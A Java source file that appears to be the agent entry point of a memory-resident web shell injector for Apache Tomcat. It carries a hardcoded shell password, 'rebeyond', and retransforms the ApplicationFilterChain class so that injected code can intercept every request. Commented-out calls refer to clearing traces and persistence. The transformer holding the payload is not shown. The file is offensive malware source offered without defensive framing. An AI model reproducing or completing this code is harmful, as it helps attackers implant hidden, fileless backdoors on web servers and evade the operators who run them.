package com.company;

import java.lang.instrument.Instrumentation;

public class Agent {
    public static String className = "org.apache.catalina.core.ApplicationFilterChain";
    public static byte[] injectFileBytes = new byte[] {}, agentFileBytes = new byte[] {};
    public static String currentPath;
    public static String password = "rebeyond";

    public static void agentmain(String agentArgs, Instrumentation inst) {
        inst.addTransformer(new Transformer(), true);
        if (agentArgs.indexOf("^") >= 0) {
            Agent.currentPath = agentArgs.split("\\^")[0];
            Agent.password = agentArgs.split("\\^")[1];
        } else {
            Agent.currentPath = agentArgs;
        }

//        System.out.println("Agent Main Done");
        Class[] loadedClasses = inst.getAllLoadedClasses();
        for (Class c : loadedClasses) {
            if (c.getName().equals(className)) {
                try {
                    inst.retransformClasses(c);
                } catch (Exception e) {
                    // TODO Auto-generated catch block
                    e.printStackTrace();
                }
            }
        }

//        try {
//            initLoad();
//            readInjectFile(Agent.currentPath);
//            readAgentFile(Agent.currentPath);
//            clear(Agent.currentPath);
//        } catch (Exception e) {
//        }
//        Agent.persist();
    }
}